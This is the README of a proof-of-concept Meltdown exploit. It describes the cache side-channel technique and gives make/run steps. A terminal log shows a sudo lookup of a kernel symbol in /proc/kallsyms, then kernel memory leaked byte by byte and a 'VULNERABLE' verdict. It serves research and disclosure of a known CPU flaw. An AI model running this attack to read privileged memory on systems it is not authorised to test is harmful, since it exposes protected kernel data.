# MELTDOWN EXPLOIT POC

Speculative optimizations execute code in a non-secure manner leaving data
traces in microarchitecture such as cache.

Lipp et. al 2018 published their code 2018-01-09 at
https://github.com/IAIK/meltdown. Look at their paper for details:
https://meltdownattack.com/meltdown.pdf.

Can only dump `linux_proc_banner` at the moment, since requires accessed memory
to be in cache and `linux_proc_banner` is cached on every read from
`/proc/version`. Might work with `prefetch`. Works with `sched_yield`.

Build with `make`, run with `./run.sh`.

Can't defeat KASLR yet, so you may need to enter your password to find
`linux_proc_banner` in the `/proc/kallsyms` (or do it manually).

Flush+Reload and target array approach taken from spectre paper https://spectreattack.com/spectre.pdf
implemented following clues from https://cyber.wtf/2017/07/28/negative-result-reading-kernel-memory-from-user-mode/.

Pandora's box is open.

Take a look at the [full exploit](https://www.youtube.com/watch?v=De4rBaAdKNA)
which works with IAIK's version on my machine.

Result:
```
$ make
cc -O2 -msse2   -c -o meltdown.o meltdown.c
cc   meltdown.o   -o meltdown
$ ./run.sh 
looking for linux_proc_banner in /proc/kallsyms
protected. requires root
+ find_linux_proc_banner /proc/kallsyms sudo
+ sudo awk 
	/linux_proc_banner/ {
		if (strtonum("0x"$1))
			print $1;
		exit 0;
	} /proc/kallsyms
+ linux_proc_banner=ffffffffa3e000a0
+ set +x
cached = 29, uncached = 271, threshold 88
read ffffffffa3e000a0 = 25 %
read ffffffffa3e000a1 = 73 s
read ffffffffa3e000a2 = 20  
read ffffffffa3e000a3 = 76 v
read ffffffffa3e000a4 = 65 e
read ffffffffa3e000a5 = 72 r
read ffffffffa3e000a6 = 73 s
read ffffffffa3e000a7 = 69 i
read ffffffffa3e000a8 = 6f o
read ffffffffa3e000a9 = 6e n
read ffffffffa3e000aa = 20  
read ffffffffa3e000ab = 25 %
read ffffffffa3e000ac = 73 s
read ffffffffa3e000ad = 20  
read ffffffffa3e000ae = 28 (
read ffffffffa3e000af = 62 b
read ffffffffa3e000b0 = 75 u
read ffffffffa3e000b1 = 69 i
read ffffffffa3e000b2 = 6c l
read ffffffffa3e000b3 = 64 d
read ffffffffa3e000b4 = 64 d
read ffffffffa3e000b5 = 40 @
VULNERABLE
VULNERABLE ON
4.10.0-42-generic #46~16.04.1-Ubuntu SMP Mon Dec 4 15:57:59 UTC 2017 x86_64
processor	: 0
vendor_id	: GenuineIntel
cpu family	: 6
model		: 158
model name	: Intel(R) Core(TM) i7-7700HQ CPU @ 2.80GHz
stepping	: 9
microcode	: 0x5e
cpu MHz		: 3499.316
cache size	: 6144 KB
physical id	: 0
```

# Works on

The Vulnerable CPU/Kernels list is moved here:
https://github.com/paboldin/meltdown-exploit/issues/19

The Invulnerable CPU/Kernels list is moved here:
https://github.com/paboldin/meltdown-exploit/issues/22
